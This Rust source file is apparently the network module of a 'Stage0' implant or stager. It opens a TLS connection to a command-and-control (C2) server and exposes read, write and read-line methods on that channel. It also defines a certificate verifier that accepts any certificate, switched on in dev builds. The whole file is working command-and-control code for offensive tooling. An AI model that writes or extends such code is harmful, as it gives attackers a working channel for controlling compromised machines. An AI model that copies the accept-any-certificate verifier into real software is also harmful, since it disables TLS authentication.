//! Network session management for Stage0
//!
//! Handles TLS session establishment with the C2 server

use crate::config::{get_c2_server, SessionConfig};
use std::error::Error;
use std::io::{BufReader, Read, Write};
use std::net::TcpStream;
use std::sync::Arc;

use rustls::{ClientConfig, ClientConnection, StreamOwned};
use rustls::client::danger::{ServerCertVerified, ServerCertVerifier, HandshakeSignatureValid};
use rustls::pki_types::{CertificateDer, ServerName, UnixTime};
use rustls::DigitallySignedStruct;

/// Dangerous verifier that accepts any certificate (for dev/testing only)
#[derive(Debug)]
struct InsecureServerCertVerifier;

impl ServerCertVerifier for InsecureServerCertVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &CertificateDer<'_>,
        _intermediates: &[CertificateDer<'_>],
        _server_name: &ServerName<'_>,
        _ocsp_response: &[u8],
        _now: UnixTime,
    ) -> Result<ServerCertVerified, rustls::Error> {
        Ok(ServerCertVerified::assertion())
    }

    fn verify_tls12_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn verify_tls13_signature(
        &self,
        _message: &[u8],
        _cert: &CertificateDer<'_>,
        _dss: &DigitallySignedStruct,
    ) -> Result<HandshakeSignatureValid, rustls::Error> {
        Ok(HandshakeSignatureValid::assertion())
    }

    fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
        vec![
            rustls::SignatureScheme::RSA_PKCS1_SHA256,
            rustls::SignatureScheme::RSA_PKCS1_SHA384,
            rustls::SignatureScheme::RSA_PKCS1_SHA512,
            rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
            rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
            rustls::SignatureScheme::ECDSA_NISTP521_SHA512,
            rustls::SignatureScheme::RSA_PSS_SHA256,
            rustls::SignatureScheme::RSA_PSS_SHA384,
            rustls::SignatureScheme::RSA_PSS_SHA512,
            rustls::SignatureScheme::ED25519,
        ]
    }
}

/// Active session with C2 server
pub struct Session {
    stream: StreamOwned<ClientConnection, TcpStream>,
}

impl Session {
    /// Creates a new session
    pub fn new(stream: StreamOwned<ClientConnection, TcpStream>) -> Self {
        Self { stream }
    }

    /// Reads data from the session
    pub fn read(&mut self, buf: &mut [u8]) -> Result<usize, Box<dyn Error>> {
        Ok(self.stream.read(buf)?)
    }

    /// Writes data to the session
    pub fn write(&mut self, buf: &[u8]) -> Result<(), Box<dyn Error>> {
        self.stream.write_all(buf)?;
        self.stream.flush()?;
        Ok(())
    }

    /// Reads a line from the session
    pub fn read_line(&mut self) -> Result<String, Box<dyn Error>> {
        let mut line = String::new();
        let mut reader = BufReader::new(&mut self.stream);

        use std::io::BufRead;
        reader.read_line(&mut line)?;

        Ok(line)
    }
}

/// Establishes a TLS session with the C2 server
pub fn establish_session() -> Result<Session, Box<dyn Error>> {
    let _config = SessionConfig::default();
    let server = get_c2_server();

    #[cfg(feature = "dev")]
    println!("[NETWORK] Establishing TLS session with {}", server);

    let parts: Vec<&str> = server.split(':').collect();
    if parts.len() != 2 {
        return Err("Invalid server address format".into());
    }

    let hostname = parts[0];

    let tls_config = create_tls_config()?;

    #[cfg(feature = "dev")]
    println!("[NETWORK] Connecting to {}...", server);

    let tcp_stream = TcpStream::connect(server)?;
    tcp_stream.set_nodelay(true)?;

    let server_name = rustls::pki_types::ServerName::try_from(hostname.to_string())?;
    let client_conn = ClientConnection::new(Arc::new(tls_config), server_name)?;
    let tls_stream = StreamOwned::new(client_conn, tcp_stream);

    #[cfg(feature = "dev")]
    println!("[NETWORK] TLS session established");

    Ok(Session::new(tls_stream))
}

/// Creates TLS client configuration
/// In dev mode: accepts any certificate (self-signed)
/// In production: validates against root CAs
fn create_tls_config() -> Result<ClientConfig, Box<dyn Error>> {
    #[cfg(feature = "dev")]
    {
        // Dev mode: accept any certificate (including self-signed)
        let config = ClientConfig::builder()
            .dangerous()
            .with_custom_certificate_verifier(Arc::new(InsecureServerCertVerifier))
            .with_no_client_auth();
        return Ok(config);
    }

    #[cfg(not(feature = "dev"))]
    {
        use webpki_roots::TLS_SERVER_ROOTS;
        let mut root_store = rustls::RootCertStore::empty();
        for cert in TLS_SERVER_ROOTS.iter() {
            root_store.roots.push(cert.clone());
        }
        let config = ClientConfig::builder()
            .with_root_certificates(root_store)
            .with_no_client_auth();
        Ok(config)
    }
}
